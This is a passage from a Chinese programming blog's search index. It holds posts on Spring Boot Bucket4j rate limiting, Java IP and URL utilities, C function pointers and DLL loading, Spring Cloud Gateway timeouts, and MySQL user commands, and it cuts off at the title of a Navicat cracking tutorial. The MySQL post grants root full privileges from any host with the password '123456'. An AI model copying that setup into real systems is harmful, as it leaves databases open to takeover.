&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建缓存配置类，并添加 @EnableCaching 注解来启用缓存功能 12345@EnableCaching@Configurationpublic class Bucket4jCacheConfig {} 创建 Controller 类 123456789101112131415161718import org.springframework.http.ResponseEntity;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class TestController { @GetMapping("hello") public ResponseEntity&lt;String&gt; hello() { return ResponseEntity.ok("Hello World"); } @GetMapping("world") public ResponseEntity&lt;String&gt; world() { return ResponseEntity.ok("Hello World"); }} 创建主启动类 12345678@SpringBootApplicationpublic class Bucket4jApplication { public static void main(String[] args) { SpringApplication.run(Bucket4jApplication.class, args); }} 创建 application.yml 主配置文件 12345678910111213141516171819202122server: port: 8080spring: application: name: bucket4j-spring-boot-caffeine cache: cache-names: - buckets caffeine: spec: maximumSize=1000000,expireAfterAccess=3600s # 设置了名为buckets的缓存，过期时间为1h，容量为1000000bucket4j: enabled: true filters: - cache-name: buckets url: .* rate-limits: - bandwidths: - capacity: 2 time: 10 unit: seconds # 设置的rate-limits每10秒2个token Bucket4j 配置参数说明如下： bucket4j.enabled=true：启用 Bucket4j 的自动配置 bucket4j.filters.cache-name：从缓存中获取 API 密钥的 Bucket bucket4j.filters.url：表示应用速率限制的路径表达式，.* 表示拦截所有 URL bucket4j.filters.rate-limits.bandwidths：定义 Bucket4j 速率限制参数 代码测试正常请求接口的时候，服务端响应的结果如下： 12345$ curl -v -X GET \'http://127.0.0.1:8080/hello\'&lt; HTTP/1.1 200&lt; X-Rate-Limit-Remaining: 1Hello World 当频繁请求接口的时候，服务端会返回 429 的 HTTP 状态码和 JSON 数据 { "message": "Too many requests!" }，如下所示： 12345$ curl -v -X GET \'http://127.0.0.1:8080/hello\'&lt; HTTP/1.1 429&lt; X-Rate-Limit-Retry-After-Seconds: 2{ "message": "Too many requests!" } 自定义限流响应结果当触发限流条件时，Bucket4j 默认会返回 429 的 HTTP 状态码，同时返回 JSON 数据 { "message": "Too many requests!" } 给客户端。若需要自定义返回的数据内容，可以配置 http-response-body 参数，如下所示： 1234567891011bucket4j: enabled: true filters: - cache-name: buckets url: .* http-response-body: \'{"code":429,"data":"","msg":"Too many requests!"}\' rate-limits: - bandwidths: - capacity: 2 time: 10 unit: seconds 参考博客 Rate Limiting a Spring API Using Bucket4j var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务 java"},{title:"Java 开发常用代码块之一",url:"/posts/677dbf04.html",text:'网络编程获取 IP 地址12345678910111213141516171819202122232425262728293031323334353637383940import cn.hutool.core.util.StrUtil;import javax.servlet.http.HttpServletRequest;/** * IP地址工具 */public class IPUtils { /** * 获取IP地址 * 如果使用Nginx等反向代理软件，不能通过request.getRemoteAddr()获取IP地址 * 如果使用了多级反向代理的话，X-Forwarded-For的值并不止一个，而是一串IP地址，X-Forwarded-For中第一个非unknown的有效IP字符串，则为真实IP地址 */ public static String getIpAddr(HttpServletRequest request) { String ip = null; try { ip = request.getHeader("x-forwarded-for"); if (StrUtil.isEmpty(ip) || "unknown".equalsIgnoreCase(ip)) { ip = request.getHeader("Proxy-Client-IP"); } if (StrUtil.isEmpty(ip) || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) { ip = request.getHeader("WL-Proxy-Client-IP"); } if (StrUtil.isEmpty(ip) || "unknown".equalsIgnoreCase(ip)) { ip = request.getHeader("HTTP_CLIENT_IP"); } if (StrUtil.isEmpty(ip) || "unknown".equalsIgnoreCase(ip)) { ip = request.getHeader("HTTP_X_FORWARDED_FOR"); } if (StrUtil.isEmpty(ip) || "unknown".equalsIgnoreCase(ip)) { ip = request.getRemoteAddr(); } } catch (Exception e) { System.out.println("IPUtils ERROR " + e.getLocalizedMessage()); } return ip; }} 正则表达式解析 URL通过正则表达式，获取 URL 中的协议、域名、端口、URI。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import cn.hutool.core.util.StrUtil;import java.util.HashMap;import java.util.Map;import java.util.regex.Matcher;import java.util.regex.Pattern;public class HttpUtil { public static final String HTTP_PROTOCOL = "http://"; public static final String HTTPS_PROTOCOL = "https://"; /** * 解析URL（包括协议、域名、端口、URI） * * @param url * @return */ public static Map&lt;String, String&gt; parseUrl(String url) { Map&lt;String, String&gt; map = new HashMap(4); try { Pattern pattern = Pattern.compile("(https?://)([^:^/]*)(:\\\\d*)?(.*)?"); Matcher matcher = pattern.matcher(url); boolean findResult = matcher.find(); if (!findResult) { return map; } String protocol = matcher.group(1); String domain = matcher.group(2); String port = matcher.group(3); String uri = matcher.group(4); if (StrUtil.isBlank(port)) { if (HTTP_PROTOCOL.equals(protocol)) { port = "80"; } else if (HTTPS_PROTOCOL.equals(protocol)) { port = "443"; } else { port = "unknown"; } } else { port = port.replace(":", ""); } map.put("protocol", protocol); map.put("domain", domain); map.put("port", port); map.put("uri", uri); } catch (Exception e) { e.printStackTrace(); } return map; }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java 代码块"},{title:"C 语言开发常用代码块之一",url:"/posts/3b2974c1.html",text:'加载动态库加载动态链接库（.dll）下述示例代码，适用于 Windows 系统的 C 语言开发。 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main() { HINSTANCE hInstance; // 加载动态链接库 hInstance = LoadLibrary("./socketclient.dll"); if (hInstance == NULL) { printf("LoadLibrary() 调用失败, ErrorCode: %d", GetLastError()); return -1; } // 定义函数类型指针 typedef int (*CltSocketInit)(void** handle); // 调用动态链接库 CltSocketInit cltSocketInit = (CltSocketInit)GetProcAddress(hInstance, "cltSocketInit"); if (cltSocketInit != NULL) { void* handle = NULL; int result = cltSocketInit(&amp;handle); printf("result = %d", result); } // 释放动态链接库 if (hInstance != NULL) { FreeLibrary(hInstance); } return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c语言 代码块"},{title:"C 语言进阶之面向接口编程和多态",url:"/posts/1844a1fe.html",text:'数组指针数组类型的语法C 语言中的数组有自己特定的类型，可以通过 typedef 关键字定义数组类型，语法格式为：typedef type(name)[length];，例如： typedef int(MyIntArray)[3]; typedef char(MyCharArray)[3]; 数组指针类型的语法 数组指针类型用于指向一个数组 可以直接定义数组指针类型：typedef type(*name)[length]; 数组类型与数组指针类型的使用12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;int main() { // 1. 定义数组类型（会分配内存空间） typedef int(MyArray)[3]; MyArray array; array[0] = 1; array[1] = 2; array[2] = 3; for (int i = 0; i &lt; 3; i++) { printf("array[%d] = %d\\n", i, array[i]); } printf("\\n"); // 2. 定义数组指针类型（不会分配内存空间） typedef int(*MyPointArray)[3]; int a[3]; MyPointArray pointArray; pointArray = &amp;a; // 将数组指针类型指向一个数组 (*pointArray)[0] = 11; (*pointArray)[1] = 22; (*pointArray)[2] = 33; for (int j = 0; j &lt; 3; j++) { printf("a[%d] = %d, ", j, a[j]); printf("(*pointArray)[%d] = %d\\n", j, (*pointArray)[j]); } printf("\\n"); // 3. 定义一个数组指针变量（不会分配内存空间） int(*pointArrayVar)[3]; int b[3]; pointArrayVar = &amp;b; // 将数组指针变量指向一个数组 (*pointArrayVar)[0] = 111; (*pointArrayVar)[1] = 222; (*pointArrayVar)[2] = 333; for (int n = 0; n &lt; 3; n++) { printf("b[%d] = %d, ", n, b[n]); printf("(*pointArrayVar)[%d] = %d\\n", n, (*pointArrayVar)[n]); }} 程序运行的输出结果如下： 1234567891011array[0] = 1array[1] = 2array[2] = 3a[0] = 11, (*pointArray)[0] = 11a[1] = 22, (*pointArray)[1] = 22a[2] = 33, (*pointArray)[2] = 33b[0] = 111, (*pointArrayVar)[0] = 111b[1] = 222, (*pointArrayVar)[1] = 222b[2] = 333, (*pointArrayVar)[2] = 333 函数指针函数类型的语法C 语言中的函数有自己特定的类型，可以通过 typedef 关键字定义函数类型，语法格式为：typedef type (name)(parameter list);，例如： typedef int (f)(int, int); typedef void (p)(int); 函数指针类型的语法 函数指针类型用于指向一个函数 函数有三大要素：名称、参数、返回值，函数名是函数体的入口地址 可以通过函数类型定义函数指针类型: FuncType* pointer; 也可以直接定义函数指针类型：typedef type (*pointer)(parameter list); pointer：函数指针变量名 type：指向函数的返回值类型 parameter list：指向函数的参数类型列表 函数类型与函数指针类型的使用12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;int add(int a, int b) { return a + b;}int main() { // 1. 定义函数类型 typedef int (MyFuncType)(int a, int b); // 通过函数类型定义函数指针类型 MyFuncType* myFuncType = add; int result = myFuncType(1, 3); printf("%d + %d = %d\\n", 1, 3, result); // 2. 定义一个函数指针类型（不会分配内存空间） typedef int (*MyFuncPointType)(int a, int b); // 加不加上"&amp;"符号都是可以的，如果加上了"&amp;"符号，可以解决C语言版本的兼容问题 // MyFuncPointType myFuncPointType = &amp;add; MyFuncPointType myFuncPointType = add; int result2 = myFuncPointType(4, 5); printf("%d + %d = %d\\n", 4, 5, result2); // 3. 定义函数指针变量（会分配内存空间） int (*MyFuncPointVar)(int a, int b); MyFuncPointVar = add; int result3 = MyFuncPointVar(7, 9); printf("%d + %d = %d\\n", 7, 9, result3); return 0;} 程序运行的输出结果如下： 1231 + 3 = 44 + 5 = 97 + 9 = 16 函数类型与函数指针作为函数参数函数类型作为函数参数当函数类型做为函数的参数传递给一个被调用函数，被调用函数就可以通过这个函数类型调用外部的函数，这就形成了回调函数。C 语言回调函数的本质是，提前做了一个协议的约定（把函数的参数、函数的返回值类型提前约定）。 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;// 定义函数类型typedef int (MyFuncType)(int a, int b);int add(int a, int b) { return a + b;}int mult(int a, int b) { return a * b;}// 函数类型作为函数参数int callbackFunc(MyFuncType func) { return func(3, 6);}int main() { // 通过函数类型定义函数指针类型 MyFuncType* myFuncType = NULL; myFuncType = add; int result = callbackFunc(*myFuncType); printf("result = %d\\n", result); myFuncType = mult; int result2 = callbackFunc(*myFuncType); printf("result = %d\\n", result2); return 0;} 程序运行的输出结果如下： 12result = 9result = 18 函数指针作为函数参数当函数指针做为函数的参数传递给一个被调用函数，被调用函数就可以通过这个指针调用外部的函数，这就形成了回调函数。C 语言回调函数的本质是，提前做了一个协议的约定（把函数的参数、函数的返回值类型提前约定）。 a) 将 “函数的调用” 和 “函数的实现” 解耦 b) 可以模拟 C++ 的多态机制（提前布局 VPTR 指针和虚函数表，找虚函数入口地址来实现函数调用） 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;int add(int a, int b) { return a + b;}int mult(int a, int b) { return a * b;}// 函数指针做函数参数int callbackFunc(int (*MyFunc)(int a, int b)) { return MyFunc(3, 4);}int main() { // 定义函数指针变量 int (*myFuncVar)(int a, int b); myFuncVar = add; int result = callbackFunc(myFuncVar); printf("result = %d\\n", result); myFuncVar = mult; int result2 = callbackFunc(myFuncVar); printf("result = %d\\n", result2); return 0;} 程序运行的输出结果如下： 12result = 7result = 12 上述的 add、mult 函数都是写在同一个源文件当中，假如 add 函数是一个库中的函数，此时就只有使用回调了，通过函数指针参数将外部函数地址传入来实现调用。日后如果库里面的 add 函数的代码作了修改，也不必改动函数调用方的代码，就可以正常实现调用，便于程序的维护和升级。 DLL 动态链接库的使用下面将介绍 C/C++ 如何开发和调用一款 Socket 客户端的 DLL 动态链接库，该 DLL 主要实现了 Socket 客户端的初始化、报文发送、报文接收、资源释放等功能，第三方可以直接调用该 DLL 实现 Socket 通信。值得一提的是，本案例并没有真正完整地实现 Socket 客户端的底层代码，更多的是使用伪代码来模拟 Socket 客户端的通信。 运行环境说明这里给出的案例代码和操作步骤，只适用于 Windows 系统的 C/C++ 开发，且依赖 Visual Studio 开发工具，不适用于 Linux 系统的 C/C++ 开发。 DLL 项目的创建新建 DLL 项目 值得一提的是，通过 Visual Studio 创建 DLL（动态链接库）项目，源文件默认的后缀是 .cpp，如果项目使用的是 C 语言，则需要将自动生成的 dllmain.cpp、pch.cpp 的文件名改为 dllmain.c、pch.c。 编写 DLL 代码 创建 socketclient.c 源文件 socketclient.c 源文件的代码如下，其中 __declspec(dllexport) 的作用是将函数导出给 DLL 的调用方 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185#include "pch.h"#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;// 定义函数指针类型，用于数据加密typedef int (*EncodeData)(unsigned char* in, int inlen, unsigned char* out, int* outlen);// 定义结构体typedef struct _Sck_Handle { char version[16]; char ip[16]; int port; unsigned char* p; int len; char* p2; EncodeData encodeCallback;} Sck_Handle;//客户端初始化__declspec(dllexport)int socketclient_init(void** handle) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL) { ret = -1; printf("function socketclient_init() err :%d check params == NULL err \\n", ret); return ret; } tmpHandle = (Sck_Handle*)malloc(sizeof(Sck_Handle)); if (tmpHandle == NULL) { ret = -2; printf("function socketclient_init() err :%d malloc err \\n", ret); return ret; } memset(tmpHandle, 0, sizeof(Sck_Handle)); strcpy(tmpHandle-&gt;version, "1.0.0.1"); strcpy(tmpHandle-&gt;ip, "192.168.12.12"); tmpHandle-&gt;port = 8081; //间接赋值 *handle = tmpHandle; return ret;}//客户端报文发送__declspec(dllexport)int socketclient_send(void* handle, unsigned char* buf, int buflen) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL || buf == NULL || buflen &lt;= 0) { ret = -2; printf("function socketclient_send() err :%d (handle == NULL || buf == NULL || buflen &lt;= 0 ) \\n", ret); return ret; } tmpHandle = (Sck_Handle*)handle; if (tmpHandle-&gt;encodeCallback == NULL) { //明文发送 tmpHandle-&gt;len = buflen; tmpHandle-&gt;p = (unsigned char*)malloc(buflen); if (tmpHandle-&gt;p == NULL) { ret = -2; printf("function socketclient_send() err :%d malloc len:%d \\n", ret, buflen); return ret; } memcpy(tmpHandle-&gt;p, buf, buflen); } else { //加密发送 unsigned char crypdata[4096]; int cryptdatalen = 4096; ret = tmpHandle-&gt;encodeCallback(buf, buflen, crypdata, &amp;cryptdatalen); if (ret != 0) { printf("function encodeCallback() err :%d \\n", ret); return ret; } tmpHandle-&gt;len = cryptdatalen; tmpHandle-&gt;p = (unsigned char*)malloc(cryptdatalen); if (tmpHandle-&gt;p == NULL) { ret = -1; printf("function socketclient_send() err :%d malloc len:%d \\n", ret, cryptdatalen); return ret; } memcpy(tmpHandle-&gt;p, crypdata, cryptdatalen); } return ret;}//客户端报文加密发送__declspec(dllexport)int socketclient_send_encode(void* handle, unsigned char* buf, int buflen, EncodeData encodeCallback) { int ret = 0; unsigned char cryptbuf[4096]; int cryptbuflen = 4096; Sck_Handle* tmpHandle = NULL; if (handle == NULL || buf == NULL || encodeCallback == NULL) { ret = -1; printf("function socketclient_send_encode() err :%d (handle == NULL || buf == NULL || encodeCallback == NULL) \\n", ret); return ret; } // 通过函数指针，执行数据的加密操作 ret = encodeCallback(buf, buflen, cryptbuf, &amp;cryptbuflen); if (ret != 0) { ret = -2; printf("function socketclient_send_encode() err :%d check encode_result == 0 err \\n", ret); return ret; } tmpHandle = (Sck_Handle*)handle; tmpHandle-&gt;len = cryptbuflen; tmpHandle-&gt;p = (unsigned char*)malloc(cryptbuflen); if (tmpHandle-&gt;p == NULL) { ret = -3; printf("function socketclient_send_encode() err :%d malloc len:%d \\n", ret, cryptbuflen); return ret; } //把加密的明文缓存到内存中 memcpy(tmpHandle-&gt;p, cryptbuf, cryptbuflen); return 0;}//客户端报文接收__declspec(dllexport)int socketclient_recv(void* handle, unsigned char* buf, int* buflen) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL || buf == NULL || buflen == NULL) { ret = -2; printf("function socketclient_recv() err :%d (handle == NULL || buf == NULL || buflen == NULL ) \\n", ret); return ret; } tmpHandle = (Sck_Handle*)handle; memcpy(buf, tmpHandle-&gt;p, tmpHandle-&gt;len); *buflen = tmpHandle-&gt;len; return ret;}//客户端资源释放__declspec(dllexport)int socketclient_destory(void* handle) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL) { return -1; } tmpHandle = (Sck_Handle*)handle; if (tmpHandle-&gt;p != NULL) { free(tmpHandle-&gt;p); //释放结构体成员域的指针所指向的内存空间 } free(tmpHandle); //释放结构体内存 handle = NULL; return 0;}//设置加密回调函数__declspec(dllexport)int socketclient_set_encode_callback(void* handle, EncodeData encodeCallback) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL || encodeCallback == NULL) { ret = -1; printf("function socketclient_set_encode_callback() err :%d check (handle == NULL || encodeCallback == NULL) err \\n", ret); return ret; } tmpHandle = (Sck_Handle*)handle; tmpHandle-&gt;encodeCallback = encodeCallback; return 0;} 生成 DLL 文件DLL 项目执行编译后，会自动在项目所在的文件夹内生成 .dll 与 .lib 文件，例如 socket-client.dll 与 socket-client.lib。在 VS Studio 的 Developer Command Prompt 命令窗口中，使用 dumpbin /exports socket-client.dll 命令，查看得到 socket-client.dll 动态链接库的详细信息如下： 12345678910111213141516171819202122232425262728293031323334353637Microsoft (R) COFF/PE Dumper Version 14.29.30136.0Copyright (C) Microsoft Corporation. All rights reserved.Dump of file socket-client.dllFile Type: DLL Section contains the following exports for socket-client.dll 00000000 characteristics FFFFFFFF time date stamp 0.00 version 1 ordinal base 6 number of functions 6 number of names ordinal hint RVA name 1 0 00011005 socketclient_destory = @ILT+0(socketclient_destory) 2 1 0001135C socketclient_init = @ILT+855(socketclient_init) 3 2 00011055 socketclient_recv = @ILT+80(socketclient_recv) 4 3 00011195 socketclient_send = @ILT+400(socketclient_send) 5 4 000112E4 socketclient_send_encode = @ILT+735(socketclient_send_encode) 6 5 00011244 socketclient_set_encode_callback = @ILT+575(socketclient_set_encode_callback) Summary 1000 .00cfg 1000 .data 1000 .idata 1000 .msvcjmc 3000 .pdata 4000 .rdata 1000 .reloc 1000 .rsrc 9000 .text 10000 .textbss 案例代码下载 点击下载完整的案例代码 DLL 的两种调用方式DLL 动态调用在本案例中，实现了通过函数指针类型，动态调用 DLL 里的函数，点击下载 使用到的 socket-client.dll 。值得一提的是，日后如果 DLL 里面的函数体代码作了修改，也不必改动函数调用方的代码（如下代码），就可以正常实现函数的调用，这样非常便于程序的维护和升级。特别注意，动态调用 DLL 里的函数时（动态加载 DLL），不需要 .h 和 .lib 文件，只需要 .dll 文件，同时要知道所要调用的函数的参数类型以及返回值类型（用于定义函数指针类型）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;stdio.h&gt;#include &lt;windows.h&gt;// 定义函数指针类型typedef int (*SocketInit)(void** handle);typedef int (*SocketSend)(void* handle, unsigned char* buf, int buflen);typedef int (*SocketRev)(void* handle, unsigned char* buf, int* buflen);typedef int (*SocketDestory)(void* handle);int main() { HINSTANCE hInstance; // 加载DLL动态链接库 hInstance = LoadLibrary("./socket-client.dll"); if (hInstance == NULL) { printf("LoadLibrary() 调用失败, ErrorCode: %d", GetLastError()); return -1; } // 调用DLL动态链接库 SocketInit socketInit = (SocketInit)GetProcAddress(hInstance, "socketclient_init"); SocketSend socketSend = (SocketSend)GetProcAddress(hInstance, "socketclient_send"); SocketRev socketRev = (SocketRev)GetProcAddress(hInstance, "socketclient_recv"); SocketDestory socketDestory = (SocketDestory)GetProcAddress(hInstance, "socketclient_destory"); if (socketInit == NULL) { return -1; } unsigned char inbuf[128]; int inbuflen = 128; unsigned char outbuf[4096]; int outbuflen = 4096; void* handle = NULL; int initResult = socketInit(&amp;handle); int sendResult = socketSend(handle, inbuf, inbuflen); int revResult = socketRev(handle, outbuf, &amp;outbuflen); int destoryResult = socketDestory(handle); printf("initResult = %d\\n", initResult); printf("sendResult = %d\\n", sendResult); printf("revResult = %d\\n", revResult); printf("destoryResult = %d\\n", destoryResult); // 释放DLL动态链接库 if (hInstance != NULL) { FreeLibrary(hInstance); } return 0;} 程序运行的输出结果如下： 1234initResult = 0sendResult = 0revResult = 0destoryResult = 0 DLL 静态调用静态调用 DLL 里的函数（静态加载 DLL），需要同时使用 .h、.lib 以及 .dll 文件，具体的操作步骤如下： a) 将 .h、.lib 以及 .dll 文件分别拷贝到项目所在的文件夹内，必须与 .c 源文件处于同一个文件夹 b) 在需要调用 DLL 的 .c 源文件中，通过 #pragma comment(lib "xxx.lib") 指令引入 .lib 文件 c) 在需要调用 DLL 的 .c 源文件中，通过 #include "xxx.h，引入 .h 头文件 d) 正常编写代码，并调用 DLL 里的函数 若使用的开发工具是 Visual Studio，则可以不通过 #pragma comment(lib "xxx.lib") 指令引入 .lib 文件。右键项目，选择 属性，导航到 配置属性 -&gt; 链接器 -&gt; 输入 -&gt; 附加依赖项，添加对应的 .lib 文件名即可，如下图所示： .h 头文件里一般定义了 DLL 动态链接库里的函数原型，例如 socket-client.h 头文件的代码如下： 123456789101112131415161718192021#ifndef _INC_MYSOCKETCLIENT_H__#define _INC_MYSOCKETCLIENT_H__#ifdef __cplusplusextern "C" {#endif typedef int (*EncodeData)(unsigned char* in, int inlen, unsigned char* out, int* outlen); int socketclient_init(void** handle); int socketclient_send(void* handle, unsigned char* buf, int buflen); int socketclient_recv(void* handle, unsigned char* buf, int* buflen); int socketclient_destory(void* handle); int socketclient_set_encode_callback(void* handle, EncodeData encodeCallback); int socketclient_send_encode(void* handle, unsigned char* buf, int buflen, EncodeData encodeCallback);#ifdef __cplusplus}#endif#endif /* _INC_MYSOCKETCLIENT_H__ */ 静态调用 DLL 里的函数（main.c）的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include "socket-client.h"int Hw_Encode(unsigned char* in, int inlen, unsigned char* out, int* outlen) { printf("function Hw_Encode() begin ....\\n"); strcpy((char*)out, "123456789"); *outlen = 9; printf("function Hw_Encode() end ....\\n"); return 0;}int Cisco_Encode(unsigned char* in, int inlen, unsigned char* out, int* outlen) { printf("function Cisco_Encode() begin ....\\n"); strcpy((char*)out, "123456789"); *outlen = 9; printf("function Cisco_Encode() end ....\\n"); return 0;}int main() { unsigned char in[1024]; int inlen; unsigned char out[1024]; int outlen; void* handle = NULL; int ret = 0; strcpy((char*)in, "aaaaaaaa"); inlen = 9; //客户端初始化 ret = socketclient_init(&amp;handle); if (ret != 0) { printf("function socketclient_init() err:%d \\n", ret); goto End; } printf("the result of socketclient_init() is %d \\n", ret); //设置加密回调函数 ret = socketclient_set_encode_callback(handle, Cisco_Encode); if (ret != 0) { printf("function socketclient_set_encode_callback() err:%d \\n", ret); } printf("the result of socketclient_set_encode_callback() is %d \\n", ret); //客户端发送报文 ret = socketclient_send(handle, in, inlen); if (ret != 0) { printf("function socketclient_send() err:%d \\n", ret); goto End; } printf("the result of socketclient_send() is %d \\n", ret); //客户端报文加密发送 ret = socketclient_send_encode(handle, in, inlen, Hw_Encode); if (ret != 0) { printf("function socketclient_send_encode() err:%d \\n", ret); goto End; } printf("the result of socketclient_send_encode() is %d \\n", ret); //客户端接收报文 ret = socketclient_recv(handle, out, &amp;outlen); if (ret != 0) { printf("function socketclient_recv() err:%d \\n", ret); goto End; } printf("the result of socketclient_recv() is %d \\n", ret);End: //客户端释放资源 ret = socketclient_destory(handle); if (ret != 0) { printf("function socketclient_destory() err:%d \\n", ret); } printf("the result of socketclient_destory() is %d \\n", ret); return 0;} 程序运行的输出结果如下： 12345678910the result of socketclient_init() is 0the result of socketclient_set_encode_callback() is 0function Cisco_Encode() begin ....function Cisco_Encode() end ....the result of socketclient_send() is 0function Hw_Encode() begin ....function Hw_Encode() end ....the result of socketclient_send_encode() is 0the result of socketclient_recv() is 0the result of socketclient_destory() is 0 案例代码下载 点击下载完整的案例代码（DLL 静态调用） 参考博客 C++ 动态加载 DLL 和静态加载 DLL，以及 DLL 的编写 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c语言"},{title:"Spring Cloud Gateway 开发随笔",url:"/posts/a6f0aaf9.html",text:'Gateway 配置路由超时时间配置路由超时配置可以为所有路由配置 HTTP 超时（响应和连接），并为每个特定路由覆盖 HTTP 超时。 全局路由的超时时间配置配置全局 HTTP 超时（响应和连接），需要使用以下两个参数： connect-timeout：必须以毫秒为单位指定连接超时时间 response-timeout：必须指定为 java.time.Duration 123456spring: cloud: gateway: httpclient: connect-timeout: 1000 response-timeout: 5s 每个路由的超时时间配置可以通过路由的 metadata 以下两个参数配置每个路由的超时时间： connect-timeout：必须以毫秒为单位指定连接超时时间 response-timeout：必须以毫秒为单位指定响应超时时间 123456789- id: per_route_timeouts uri: https://example.org predicates: - name: Path args: pattern: /delay/{timeout} metadata: response-timeout: 1000 connect-timeout: 1000 使用 Java DSL 为每个路由配置超时时间123456789101112131415import static org.springframework.cloud.gateway.support.RouteMetadataUtils.CONNECT_TIMEOUT_ATTR;import static org.springframework.cloud.gateway.support.RouteMetadataUtils.RESPONSE_TIMEOUT_ATTR;@Beanpublic RouteLocator customRouteLocator(RouteLocatorBuilder routeBuilder){ return routeBuilder.routes() .route("test1", r -&gt; { return r.host("*.somehost.org").and().path("/somepath") .filters(f -&gt; f.addRequestHeader("header1", "header-value-1")) .uri("http://someuri") .metadata(RESPONSE_TIMEOUT_ATTR, 1000) .metadata(CONNECT_TIMEOUT_ATTR, 1000); }) .build();} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务 开发随笔"},{title:"MySQL 常用命令",url:"/posts/31eec5f6.html",text:"用户管理创建用户创建普通用户，并完全授权访问特定的数据库 12345create user 'clay'@'%' identified by '123456';grant all privileges on mysql_db.* to 'clay'@'%';flush privileges; 删除用户删除用户及权限 1drop user 'clay'@'%'; 创建只读用户创建普通用户，并授予特定数据库的只读权限 123grant select on mysql_db.* to 'clay'@'%' identified by '123456';flush privileges; 权限管理查看用户的所有权限1show grants for 'clay'@'%'; 授权 Root 用户远程登录*.* 代表所有数据库所有权限，'root'@'%' 中的 root 代表用户名，% 代表所有的访问地址，123456 是登录密码 123GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;FLUSH PRIVILEGES; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"全栈技术驿站\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"random\": \"0.9\" }); } catch(e) { console.warn(e.name + \" : \" + e.message); } }",tags:"数据库"},{title:"Navicat Premium 15 永久破解教程",url:"/posts/319e35f3.html",text:'前言这篇文章主要介绍 